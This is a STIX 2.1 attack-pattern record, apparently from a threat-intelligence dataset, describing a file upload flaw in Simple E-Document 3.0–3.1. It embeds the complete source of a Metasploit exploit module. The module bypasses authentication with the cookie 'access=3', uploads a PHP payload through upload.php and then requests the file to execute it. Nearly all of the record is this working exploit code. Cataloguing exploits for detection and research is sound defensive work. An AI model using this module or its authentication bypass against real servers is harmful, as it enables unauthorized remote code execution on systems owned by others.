{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--06c41576-9f41-4c09-b8a1-3463b5449dd2",
    "created": "2024-08-14T17:12:11.442329Z",
    "modified": "2024-08-14T17:12:11.442333Z",
    "name": "\"Simple E-Document Arbitrary File Upload\"",
    "description": " This module exploits a file upload vulnerability found in Simple E-Document versions 3.0 to 3.1. Attackers can bypass authentication and abuse the upload feature in order to upload malicious PHP files which results in arbitrary remote code execution as the web server user. File uploads are disabled by default.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/simple_e_document_upload_exec.rb",
            "external_id": "simple_e_document_upload_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Simple E-Document Arbitrary File Upload\",\n      'Description'    => %q{\n        This module exploits a file upload vulnerability found in Simple\n        E-Document versions 3.0 to 3.1. Attackers can bypass authentication and\n        abuse the upload feature in order to upload malicious PHP files which\n        results in arbitrary remote code execution as the web server user. File\n        uploads are disabled by default.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'vinicius777[at]gmail.com', # Auth bypass discovery and PoC, kinda\n          'bcoles' # Metasploit\n        ],\n      'References'     =>\n        [\n          # This EDB uses SQLI for auth bypass which isn't needed.\n          # Sending \"Cookie: access=3\" with all requests is all\n          # that's needed for auth bypass.\n          ['EDB', '31142']\n        ],\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          # Arbitrary big number. The payload gets sent as an HTTP\n          # response body, so really it's unlimited\n          'Space'       => 262144 # 256k\n        },\n      'Arch'           => ARCH_PHP,\n      'Platform'       => 'php',\n      'Targets'        =>\n        [\n          # Tested on Simple E-Document versions 3.0 and 3.1\n          [ 'Generic (PHP Payload)', {} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2014-01-23',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The base path to Simple E-Document', '/simple_e_document_v_1_31/'])\n        ])\n  end\n\n  #\n  # Checks if target allows file uploads\n  #\n  def check\n    res = send_request_raw({\n      'uri'    => normalize_uri(target_uri.path, 'upload.php'),\n      'cookie' => 'access=3'\n    })\n\n    unless res\n      vprint_error(\"Connection timed out\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res.body and res.body.to_s =~ /File Uploading Has Been Disabled/\n      vprint_error(\"File uploads are disabled\")\n      return Exploit::CheckCode::Safe\n    end\n\n    if res.body and res.body.to_s =~ /Upload File/\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  #\n  # Uploads our malicious file\n  #\n  def upload\n    @fname = \"#{rand_text_alphanumeric(rand(10)+6)}.php\"\n    php  = \"<?php #{payload.encoded} ?>\"\n\n    data = Rex::MIME::Message.new\n    data.add_part('upload', nil, nil, 'form-data; name=\"op1\"')\n    data.add_part(php, 'application/octet-stream', nil, \"form-data; name=\\\"fileupload\\\"; filename=\\\"#{@fname}\\\"\")\n    post_data = data.to_s\n\n    print_status(\"Uploading PHP payload...\")\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, 'upload.php'),\n      'ctype'    => \"multipart/form-data; boundary=#{data.bound}\",\n      'cookie'   => 'access=3',\n      'data'     => post_data,\n      'vars_get' => {\n        'op' => 'newin'\n      }\n    })\n\n    fail_with(Failure::Unknown, \"#{peer} - Request timed out while uploading\") unless res\n    fail_with(Failure::NotFound, \"#{peer} - No upload.php found\") if res.code.to_i == 404\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unable to write #{@fname}\") if res.body and (res.body =~ /Couldn't copy/ or res.body !~ /file uploaded\\!/)\n\n    print_good(\"Payload uploaded successfully.\")\n    register_files_for_cleanup(@fname)\n\n    if res.body.to_s =~ /<br>folder to use: .+#{target_uri.path}\\/?(.+)<br>/\n        @upload_path = normalize_uri(target_uri.path, \"#{$1}\")\n        print_good(\"Found upload path #{@upload_path}\")\n    else\n        @upload_path = normalize_uri(target_uri.path, 'in')\n        print_warning(\"Could not find upload path - assuming '#{@upload_path}'\")\n    end\n  end\n\n  #\n  # Executes our uploaded malicious file\n  #\n  def exec\n    print_status(\"Executing #{@fname}...\")\n    res = send_request_raw({\n      'uri'    => normalize_uri(@upload_path, @fname),\n      'cookie' => 'access=3'\n    })\n    if res and res.code == 404\n      fail_with(Failure::NotFound, \"#{peer} - Not found: #{@fname}\")\n    end\n  end\n\n  #\n  # Just upload and execute\n  #\n  def exploit\n    upload\n    exec\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-01-23",
    "x_mitre_platforms": [
        "php'"
    ]
}